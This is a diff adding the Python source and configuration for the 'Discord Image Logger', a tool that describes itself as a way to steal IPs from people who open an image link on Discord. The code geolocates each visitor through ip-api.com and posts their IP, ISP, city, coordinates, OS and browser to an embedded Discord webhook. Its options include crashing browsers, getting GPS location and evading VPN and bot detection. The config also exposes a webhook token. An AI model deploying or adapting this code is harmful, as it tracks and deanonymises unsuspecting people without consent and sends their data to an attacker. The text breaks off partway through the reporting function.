@@ -1,0 +1,306 @@
+requests
+httpagentparser
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
+
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
+
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1100420311029141535/nmCa3dB3jkk84t2GuZbMuJteHJ-NBHN31ZzDDzGa7NAoDWwrIO2bugRpryh9Jftf7zXS",
+    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+
+    # CUSTOMIZATION #
+    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
+    },
+
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
+
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
+    },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
+}
+
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
+
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
+
+    ping = "@everyone"
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+                return
+        
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
+                return
+
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+
+        if config["antiBot"] == 1:
+                ping = ""
+
+
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    embed = {
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
+
+**Endpoint:** `{endpoint}`
+            
+**IP Info:**
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
+
